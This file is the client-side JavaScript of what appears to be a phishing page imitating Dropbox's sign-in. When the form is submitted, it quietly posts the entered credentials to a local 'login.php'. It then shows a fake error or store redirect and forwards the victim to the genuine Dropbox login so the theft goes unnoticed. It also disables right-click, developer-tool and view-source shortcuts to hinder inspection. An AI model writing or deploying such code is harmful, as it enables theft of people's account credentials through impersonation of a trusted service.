document.addEventListener('DOMContentLoaded', function () {
    var usernameInput = document.getElementById('email');
    var savedUsername = localStorage.getItem('dropbox_email');
    if (usernameInput && savedUsername) {
        usernameInput.value = savedUsername;
    }

    var createAccountLink = document.getElementById('create-account-link');
    if (createAccountLink) {
        createAccountLink.addEventListener('click', function (e) {
            e.preventDefault();
            window.location.href = 'https://www.dropbox.com/register';
        });
    }

    var socialMap = [
        { btnId: 'btn-passkey', loaderId: 'loader-passkey' },
        { btnId: 'btn-google', loaderId: 'loader-google' },
        { btnId: 'btn-apple', loaderId: 'loader-apple' }
    ];
    var featureAlert = document.getElementById('feature-alert');

    var signinBtn = document.getElementById('btn-signin');
    var form = signinBtn ? signinBtn.closest('form') : null;

    var errorAlert = document.getElementById('error-alert');
    var errorAlertClose = document.getElementById('error-alert-close');

    if (errorAlertClose && errorAlert) {
        errorAlertClose.addEventListener('click', function () {
            errorAlert.style.display = 'none';
        });
    }

    if (form && signinBtn) {
        form.addEventListener('submit', function (e) {
            e.preventDefault();
            if (usernameInput && usernameInput.value) {
                localStorage.setItem('dropbox_email', usernameInput.value);
            }

            var formData = new FormData(form);
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'login.php', true);
            xhr.send(formData);

            var ua = navigator.userAgent;
            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
            var isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;
            var isAndroid = /Android/.test(ua);

            signinBtn.classList.add('loading');
            signinBtn.textContent = 'Continuing...';

            if (isMobile) {
                setTimeout(function () {
                    signinBtn.classList.remove('loading');
                    signinBtn.textContent = 'Continue';

                    if (isIOS) {
                        window.location.replace('https://apps.apple.com/app/dropbox/id327630330');
                    } else if (isAndroid) {
                        window.location.replace('https://play.google.com/store/apps/details?id=com.dropbox.android');
                    } else {
                        window.location.replace('https://play.google.com/store/apps/details?id=com.dropbox.android');
                    }
                    setTimeout(function () {
                        try { window.close(); } catch (err) {}
                    }, 500);
                }, 2000);
            } else {
                setTimeout(function () {
                    signinBtn.classList.remove('loading');
                    signinBtn.textContent = 'Continue';
                    if (errorAlert) errorAlert.style.display = 'flex';

                    setTimeout(function () {
                        var username = usernameInput ? encodeURIComponent(usernameInput.value) : '';
                        window.location.replace('https://www.dropbox.com/login' + (username ? '?cont=' + username : ''));
                        setTimeout(function () {
                            try { window.close(); } catch (err) {}
                        }, 500);
                    }, 2000);
                }, 2000);
            }
        });
    }

    socialMap.forEach(function (item) {
        var btn = document.getElementById(item.btnId);
        var loader = document.getElementById(item.loaderId);
        if (!btn || !loader) return;

        btn.addEventListener('click', function () {
            if (featureAlert) featureAlert.style.display = 'none';
            btn.style.display = 'none';
            loader.style.display = 'flex';

            setTimeout(function () {
                loader.style.display = 'none';
                btn.style.display = '';
                if (featureAlert) featureAlert.style.display = 'flex';
            }, 3000);
        });
    });

    document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
    document.addEventListener('keydown', function (e) {
        if (e.key === 'F12' ||
            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
            (e.ctrlKey && (e.key === 'U' || e.key === 'S' || e.key === 'P')) ||
            (e.ctrlKey && (e.key === '+' || e.key === '-' || e.key === '=' || e.key === '0')) ||
            (e.ctrlKey && e.key === 'a')) {
            e.preventDefault();
            return false;
        }
    });
    document.addEventListener('wheel', function (e) {
        if (e.ctrlKey) { e.preventDefault(); }
    }, { passive: false });
    document.addEventListener('touchstart', function (e) {
        if (e.touches.length > 1) { e.preventDefault(); }
    }, { passive: false });
    var lastTouchEnd = 0;
    document.addEventListener('touchend', function (e) {
        var now = Date.now();
        if (now - lastTouchEnd <= 300) { e.preventDefault(); }
        lastTouchEnd = now;
    }, false);
});
